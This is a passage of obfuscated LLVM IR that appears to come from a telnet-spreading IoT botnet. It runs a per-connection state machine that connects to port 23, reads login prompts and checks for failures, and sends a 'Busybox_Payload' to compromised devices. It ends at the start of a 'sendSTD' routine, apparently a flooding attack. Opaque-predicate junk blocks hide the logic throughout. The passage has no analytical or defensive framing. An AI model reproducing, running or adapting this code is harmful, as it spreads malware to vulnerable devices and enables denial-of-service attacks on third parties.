  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1175, i32 0, i32 9
  store i32 %1172, i32* %1176, align 8
  %1177 = load i32, i32* %11, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1178
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1179, i32 0, i32 0
  %1181 = load i32, i32* %1180, align 8
  %1182 = load i8*, i8** @Busybox_Payload, align 8
  %1183 = load i8*, i8** @Busybox_Payload, align 8
  %1184 = call i64 @strlen(i8* %1183) #9
  %1185 = call i64 @send(i32 %1181, i8* %1182, i64 %1184, i32 16384)
  %1186 = icmp slt i64 %1185, 0
  br i1 %1186, label %1187, label %1202

; <label>:1187:                                   ; preds = %1170
  %1188 = load i32, i32* %11, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 8
  %1193 = call i32 @sclose(i32 %1192)
  %1194 = load i32, i32* %11, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 3
  store i8 0, i8* %1197, align 4
  %1198 = load i32, i32* %11, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 4
  store i8 1, i8* %1201, align 1
  br label %1284

; <label>:1202:                                   ; preds = %1170
  %1203 = load i32, i32* @x.99
  %1204 = load i32, i32* @y.100
  %1205 = sub i32 %1203, 1
  %1206 = mul i32 %1203, %1205
  %1207 = urem i32 %1206, 2
  %1208 = icmp eq i32 %1207, 0
  %1209 = icmp slt i32 %1204, 10
  %1210 = or i1 %1208, %1209
  br i1 %1210, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1202
  %1211 = load i32, i32* %11, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 4
  store i8 3, i8* %1214, align 1
  %1215 = load i32, i32* %11, align 4
  %1216 = sext i32 %1215 to i64
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1216
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1217, i32 0, i32 9
  %1219 = load i32, i32* %1218, align 8
  %1220 = add i32 %1219, 60
  %1221 = zext i32 %1220 to i64
  %1222 = call i64 @time(i64* null) #5
  %1223 = icmp slt i64 %1221, %1222
  %1224 = load i32, i32* @x.99
  %1225 = load i32, i32* @y.100
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBBpart2222, label %originalBB218alteredBB

originalBBpart2222:                               ; preds = %originalBB218
  br i1 %1223, label %1232, label %1266

; <label>:1232:                                   ; preds = %originalBBpart2222
  %1233 = load i32, i32* @x.99
  %1234 = load i32, i32* @y.100
  %1235 = sub i32 %1233, 1
  %1236 = mul i32 %1233, %1235
  %1237 = urem i32 %1236, 2
  %1238 = icmp eq i32 %1237, 0
  %1239 = icmp slt i32 %1234, 10
  %1240 = or i1 %1238, %1239
  br i1 %1240, label %originalBB224, label %originalBB224alteredBB

originalBB224:                                    ; preds = %originalBB224alteredBB, %1232
  %1241 = load i32, i32* %11, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 4
  %1245 = load i8, i8* %1244, align 1
  %1246 = zext i8 %1245 to i32
  %1247 = icmp ne i32 %1246, 3
  %1248 = load i32, i32* @x.99
  %1249 = load i32, i32* @y.100
  %1250 = sub i32 %1248, 1
  %1251 = mul i32 %1248, %1250
  %1252 = urem i32 %1251, 2
  %1253 = icmp eq i32 %1252, 0
  %1254 = icmp slt i32 %1249, 10
  %1255 = or i1 %1253, %1254
  br i1 %1255, label %originalBBpart2226, label %originalBB224alteredBB

originalBBpart2226:                               ; preds = %originalBB224
  br i1 %1247, label %1256, label %1257

; <label>:1256:                                   ; preds = %originalBBpart2226
  br label %1257

; <label>:1257:                                   ; preds = %1256, %originalBBpart2226
  %1258 = load i32, i32* %11, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 3
  store i8 0, i8* %1261, align 4
  %1262 = load i32, i32* %11, align 4
  %1263 = sext i32 %1262 to i64
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 4
  store i8 1, i8* %1265, align 1
  br label %1266

; <label>:1266:                                   ; preds = %1257, %originalBBpart2222
  br label %1267

; <label>:1267:                                   ; preds = %1266, %originalBBpart2216, %originalBBpart2208, %originalBBpart2178, %originalBBpart2170, %738, %originalBBpart2150, %586, %originalBBpart274, %originalBBpart229
  %1268 = load i32, i32* @x.99
  %1269 = load i32, i32* @y.100
  %1270 = sub i32 %1268, 1
  %1271 = mul i32 %1268, %1270
  %1272 = urem i32 %1271, 2
  %1273 = icmp eq i32 %1272, 0
  %1274 = icmp slt i32 %1269, 10
  %1275 = or i1 %1273, %1274
  br i1 %1275, label %originalBB228, label %originalBB228alteredBB

originalBB228:                                    ; preds = %originalBB228alteredBB, %1267
  %1276 = load i32, i32* @x.99
  %1277 = load i32, i32* @y.100
  %1278 = sub i32 %1276, 1
  %1279 = mul i32 %1276, %1278
  %1280 = urem i32 %1279, 2
  %1281 = icmp eq i32 %1280, 0
  %1282 = icmp slt i32 %1277, 10
  %1283 = or i1 %1281, %1282
  br i1 %1283, label %originalBBpart2230, label %originalBB228alteredBB

originalBBpart2230:                               ; preds = %originalBB228
  br label %1284

; <label>:1284:                                   ; preds = %originalBBpart2230, %1187, %originalBBpart2212, %originalBBpart2186, %917, %originalBBpart2174, %806, %729, %696, %634, %529, %525, %283, %253, %240
  %1285 = load i32, i32* %11, align 4
  %1286 = add nsw i32 %1285, 1
  store i32 %1286, i32* %11, align 4
  br label %120

; <label>:1287:                                   ; preds = %originalBBpart225
  br label %118
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1289 = alloca [128 x i8], align 16
  %1290 = alloca i32, align 4
  %1291 = alloca i32, align 4
  %1292 = alloca i32, align 4
  %1293 = alloca i32, align 4
  %1294 = alloca %struct.fd_set, align 8
  %1295 = alloca %struct.timeval, align 8
  %1296 = alloca i32, align 4
  %1297 = alloca %struct.sockaddr_in, align 4
  %1298 = alloca i8*, align 8
  %1299 = alloca i8*, align 8
  %1300 = alloca i32, align 4
  %1301 = alloca i32, align 4
  store i32 256, i32* %1290, align 4
  %1302 = call i64 @time(i64* null) #5
  %1303 = call i32 @rand_cmwc()
  %1304 = zext i32 %1303 to i64
  %_ = sub i64 0, %1302
  %gen = add i64 %_, %1304
  %1305 = xor i64 %1302, %1304
  %1306 = trunc i64 %1305 to i32
  call void @srand(i32 %1306) #5
  %1307 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1297, i32 0, i32 0
  store i16 2, i16* %1307, align 4
  %1308 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1297, i32 0, i32 1
  store i16 %1308, i16* %1309, align 2
  %1310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1297, i32 0, i32 3
  %1311 = getelementptr inbounds [8 x i8], [8 x i8]* %1310, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1311, i8 0, i64 8, i32 4, i1 false)
  %1312 = load i32, i32* %1290, align 4
  %1313 = zext i32 %1312 to i64
  %1314 = call i8* @llvm.stacksave()
  store i8* %1314, i8** %1298, align 8
  %1315 = alloca %struct.telstate_t, i64 %1313, align 16
  %1316 = bitcast %struct.telstate_t* %1315 to i8*
  %1317 = load i32, i32* %1290, align 4
  %1318 = sext i32 %1317 to i64
  %_1 = sub i64 0, %1318
  %gen2 = add i64 %_1, 5
  %1319 = mul i64 %1318, 5
  call void @llvm.memset.p0i8.i64(i8* %1316, i8 0, i64 %1319, i32 16, i1 false)
  store i32 0, i32* %1291, align 4
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %48
  %1320 = load i32, i32* %11, align 4
  %1321 = load i32, i32* %10, align 4
  %1322 = icmp slt i32 %1320, %1321
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %82
  %1323 = load i32, i32* %11, align 4
  %_8 = sub i32 %1323, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 %1323, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 %1323, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %1323, 1
  %gen15 = mul i32 %_14, 1
  %1324 = add nsw i32 %1323, 1
  store i32 %1324, i32* %11, align 4
  br label %originalBB7

originalBB19alteredBB:                            ; preds = %originalBB19, %101
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %120
  %1325 = load i32, i32* %11, align 4
  %1326 = load i32, i32* %10, align 4
  %1327 = icmp slt i32 %1325, %1326
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %154
  %1328 = load i32, i32* %11, align 4
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1329
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 3
  %1332 = load i8, i8* %1331, align 4
  %1333 = zext i8 %1332 to i32
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %204
  %1334 = load i32, i32* %11, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 6
  %1338 = load i8, i8* %1337, align 1
  %_32 = sub i8 %1338, 1
  %gen33 = mul i8 %_32, 1
  %_34 = shl i8 %1338, 1
  %_35 = sub i8 0, %1338
  %gen36 = add i8 %_35, 1
  %_37 = sub i8 0, %1338
  %gen38 = add i8 %_37, 1
  %_39 = shl i8 %1338, 1
  %_40 = shl i8 %1338, 1
  %1339 = add i8 %1338, 1
  store i8 %1339, i8* %1337, align 1
  %1340 = load i32, i32* %11, align 4
  %1341 = sext i32 %1340 to i64
  %1342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1341
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1342, i32 0, i32 5
  %1344 = load i8, i8* %1343, align 2
  %_41 = sub i8 %1344, 1
  %gen42 = mul i8 %_41, 1
  %_43 = shl i8 %1344, 1
  %_44 = sub i8 %1344, 1
  %gen45 = mul i8 %_44, 1
  %_46 = sub i8 0, %1344
  %gen47 = add i8 %_46, 1
  %_48 = sub i8 %1344, 1
  %gen49 = mul i8 %_48, 1
  %1345 = add i8 %1344, 1
  store i8 %1345, i8* %1343, align 2
  %1346 = load i32, i32* %11, align 4
  %1347 = sext i32 %1346 to i64
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1347
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1348, i32 0, i32 6
  %1350 = load i8, i8* %1349, align 1
  %1351 = zext i8 %1350 to i64
  %1352 = icmp eq i64 %1351, 7
  br label %originalBB31

originalBB53alteredBB:                            ; preds = %originalBB53, %284
  %1353 = load i32, i32* %11, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 0
  %1357 = load i32, i32* %1356, align 8
  %1358 = load i32, i32* %11, align 4
  %1359 = sext i32 %1358 to i64
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1359
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1360, i32 0, i32 0
  %1362 = load i32, i32* %1361, align 8
  %1363 = call i32 (i32, i32, ...) @fcntl(i32 %1362, i32 3, i8* null)
  %_54 = sub i32 %1363, 2048
  %gen55 = mul i32 %_54, 2048
  %_56 = sub i32 0, %1363
  %gen57 = add i32 %_56, 2048
  %_58 = sub i32 0, %1363
  %gen59 = add i32 %_58, 2048
  %_60 = sub i32 0, %1363
  %gen61 = add i32 %_60, 2048
  %_62 = sub i32 0, %1363
  %gen63 = add i32 %_62, 2048
  %_64 = shl i32 %1363, 2048
  %1364 = or i32 %1363, 2048
  %1365 = call i32 (i32, i32, ...) @fcntl(i32 %1357, i32 4, i32 %1364)
  %1366 = load i32, i32* %11, align 4
  %1367 = sext i32 %1366 to i64
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1367
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1368, i32 0, i32 0
  %1370 = load i32, i32* %1369, align 8
  %1371 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %1372 = call i32 @connect(i32 %1370, %struct.sockaddr* %1371, i32 16)
  %1373 = icmp eq i32 %1372, -1
  br label %originalBB53

originalBB68alteredBB:                            ; preds = %originalBB68, %337
  %1374 = load i32, i32* %11, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 3
  store i8 1, i8* %1377, align 4
  %1378 = load i32, i32* %11, align 4
  %1379 = sext i32 %1378 to i64
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1379
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1380, i32 0, i32 9
  store i32 0, i32* %1381, align 8
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %362
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %379
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %406
  %1382 = load i32, i32* %11, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 0
  %1386 = load i32, i32* %1385, align 8
  %_81 = shl i32 %1386, 64
  %_82 = shl i32 %1386, 64
  %_83 = sub i32 0, %1386
  %gen84 = add i32 %_83, 64
  %1387 = srem i32 %1386, 64
  %1388 = zext i32 %1387 to i64
  %_85 = shl i64 1, %1388
  %_86 = sub i64 1, %1388
  %gen87 = mul i64 %_86, %1388
  %_88 = shl i64 1, %1388
  %_89 = shl i64 1, %1388
  %_90 = shl i64 1, %1388
  %_91 = sub i64 1, %1388
  %gen92 = mul i64 %_91, %1388
  %1389 = shl i64 1, %1388
  %1390 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %1391 = load i32, i32* %11, align 4
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1392
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1393, i32 0, i32 0
  %1395 = load i32, i32* %1394, align 8
  %_93 = shl i32 %1395, 64
  %_94 = sub i32 0, %1395
  %gen95 = add i32 %_94, 64
  %_96 = shl i32 %1395, 64
  %_97 = sub i32 %1395, 64
  %gen98 = mul i32 %_97, 64
  %_99 = sub i32 %1395, 64
  %gen100 = mul i32 %_99, 64
  %_101 = shl i32 %1395, 64
  %_102 = shl i32 %1395, 64
  %_103 = sub i32 0, %1395
  %gen104 = add i32 %_103, 64
  %_105 = sub i32 0, %1395
  %gen106 = add i32 %_105, 64
  %1396 = sdiv i32 %1395, 64
  %1397 = sext i32 %1396 to i64
  %1398 = getelementptr inbounds [16 x i64], [16 x i64]* %1390, i64 0, i64 %1397
  %1399 = load i64, i64* %1398, align 8
  %_107 = sub i64 %1399, %1389
  %gen108 = mul i64 %_107, %1389
  %_109 = sub i64 0, %1399
  %gen110 = add i64 %_109, %1389
  %_111 = sub i64 %1399, %1389
  %gen112 = mul i64 %_111, %1389
  %_113 = sub i64 %1399, %1389
  %gen114 = mul i64 %_113, %1389
  %_115 = sub i64 %1399, %1389
  %gen116 = mul i64 %_115, %1389
  %_117 = shl i64 %1399, %1389
  %_118 = sub i64 %1399, %1389
  %gen119 = mul i64 %_118, %1389
  %1400 = or i64 %1399, %1389
  store i64 %1400, i64* %1398, align 8
  %1401 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 0
  store i64 0, i64* %1401, align 8
  %1402 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 1
  store i64 10000, i64* %1402, align 8
  %1403 = load i32, i32* %11, align 4
  %1404 = sext i32 %1403 to i64
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1404
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1405, i32 0, i32 0
  %1407 = load i32, i32* %1406, align 8
  %_120 = shl i32 %1407, 1
  %_121 = sub i32 %1407, 1
  %gen122 = mul i32 %_121, 1
  %_123 = sub i32 0, %1407
  %gen124 = add i32 %_123, 1
  %_125 = sub i32 0, %1407
  %gen126 = add i32 %_125, 1
  %_127 = sub i32 0, %1407
  %gen128 = add i32 %_127, 1
  %_129 = sub i32 %1407, 1
  %gen130 = mul i32 %_129, 1
  %_131 = sub i32 0, %1407
  %gen132 = add i32 %_131, 1
  %1408 = add nsw i32 %1407, 1
  %1409 = call i32 @select(i32 %1408, %struct.fd_set* null, %struct.fd_set* %14, %struct.fd_set* null, %struct.timeval* %15)
  store i32 %1409, i32* %12, align 4
  %1410 = load i32, i32* %12, align 4
  %1411 = icmp eq i32 %1410, 1
  br label %originalBB80

originalBB136alteredBB:                           ; preds = %originalBB136, %453
  store i32 4, i32* %16, align 4
  store i32 0, i32* %13, align 4
  %1412 = load i32, i32* %11, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 0
  %1416 = load i32, i32* %1415, align 8
  %1417 = bitcast i32* %13 to i8*
  %1418 = call i32 @getsockopt(i32 %1416, i32 1, i32 4, i8* %1417, i32* %16) #5
  %1419 = load i32, i32* %13, align 4
  %1420 = icmp ne i32 %1419, 0
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %555
  %1421 = load i32, i32* %11, align 4
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1422
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1423, i32 0, i32 0
  %1425 = load i32, i32* %1424, align 8
  %1426 = call i32 @sclose(i32 %1425)
  %1427 = load i32, i32* %11, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 3
  store i8 0, i8* %1430, align 4
  %1431 = load i32, i32* %11, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 4
  store i8 1, i8* %1434, align 1
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %600
  %1435 = load i32, i32* %11, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 11
  %1439 = load i8*, i8** %1438, align 8
  %1440 = call i32 @contains_fail(i8* %1439)
  %1441 = icmp ne i32 %1440, 0
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %654
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %705
  %1442 = load i32, i32* %11, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 0
  %1446 = load i32, i32* %1445, align 8
  %1447 = call i64 @send(i32 %1446, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %1448 = icmp slt i64 %1447, 0
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %743
  %1449 = load i32, i32* %11, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 0
  %1453 = load i32, i32* %1452, align 8
  %1454 = load i32, i32* %11, align 4
  %1455 = sext i32 %1454 to i64
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1455
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1456, i32 0, i32 11
  %1458 = load i8*, i8** %1457, align 8
  %1459 = call i32 @read_until_response(i32 %1453, i32 10000, i8* %1458, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %1460 = icmp ne i32 %1459, 0
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %785
  %1461 = load i32, i32* %11, align 4
  %1462 = sext i32 %1461 to i64
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1462
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1463, i32 0, i32 3
  store i8 5, i8* %1464, align 4
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %817
  %1465 = load i32, i32* %11, align 4
  %1466 = sext i32 %1465 to i64
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1466
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1467, i32 0, i32 3
  store i8 0, i8* %1468, align 4
  %1469 = load i32, i32* %11, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 4
  store i8 1, i8* %1472, align 1
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %842
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %884
  %1473 = load i32, i32* %11, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 3
  store i8 0, i8* %1476, align 4
  %1477 = load i32, i32* %11, align 4
  %1478 = sext i32 %1477 to i64
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1478
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1479, i32 0, i32 4
  store i8 1, i8* %1480, align 1
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %926
  %1481 = load i32, i32* %11, align 4
  %1482 = sext i32 %1481 to i64
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1482
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1483, i32 0, i32 3
  store i8 6, i8* %1484, align 4
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %960
  %1485 = call i64 @time(i64* null) #5
  %1486 = trunc i64 %1485 to i32
  %1487 = load i32, i32* %11, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 9
  store i32 %1486, i32* %1490, align 8
  %1491 = load i32, i32* %11, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 11
  %1495 = load i8*, i8** %1494, align 8
  %1496 = call i32 @contains_fail(i8* %1495)
  %1497 = icmp ne i32 %1496, 0
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1044
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1061
  %1498 = load i32, i32* %11, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 9
  %1502 = load i32, i32* %1501, align 8
  %_189 = sub i32 0, %1502
  %gen190 = add i32 %_189, 6
  %_191 = sub i32 0, %1502
  %gen192 = add i32 %_191, 6
  %_193 = sub i32 0, %1502
  %gen194 = add i32 %_193, 6
  %_195 = sub i32 %1502, 6
  %gen196 = mul i32 %_195, 6
  %_197 = sub i32 0, %1502
  %gen198 = add i32 %_197, 6
  %_199 = sub i32 0, %1502
  %gen200 = add i32 %_199, 6
  %_201 = sub i32 %1502, 6
  %gen202 = mul i32 %_201, 6
  %1503 = add i32 %1502, 6
  %1504 = zext i32 %1503 to i64
  %1505 = call i64 @time(i64* null) #5
  %1506 = icmp slt i64 %1504, %1505
  br label %originalBB188

originalBB206alteredBB:                           ; preds = %originalBB206, %1096
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1124
  %1507 = load i32, i32* %11, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1508
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1509, i32 0, i32 3
  store i8 0, i8* %1510, align 4
  %1511 = load i32, i32* %11, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 4
  store i8 1, i8* %1514, align 1
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1149
  %1515 = load i32, i32* %11, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 3
  store i8 8, i8* %1518, align 4
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1202
  %1519 = load i32, i32* %11, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1520
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1521, i32 0, i32 4
  store i8 3, i8* %1522, align 1
  %1523 = load i32, i32* %11, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1524
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1525, i32 0, i32 9
  %1527 = load i32, i32* %1526, align 8
  %_219 = sub i32 %1527, 60
  %gen220 = mul i32 %_219, 60
  %1528 = add i32 %1527, 60
  %1529 = zext i32 %1528 to i64
  %1530 = call i64 @time(i64* null) #5
  %1531 = icmp slt i64 %1529, %1530
  br label %originalBB218

originalBB224alteredBB:                           ; preds = %originalBB224, %1232
  %1532 = load i32, i32* %11, align 4
  %1533 = sext i32 %1532 to i64
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1533
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1534, i32 0, i32 4
  %1536 = load i8, i8* %1535, align 1
  %1537 = zext i8 %1536 to i32
  %1538 = icmp ne i32 %1537, 3
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %1267
  br label %originalBB228
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
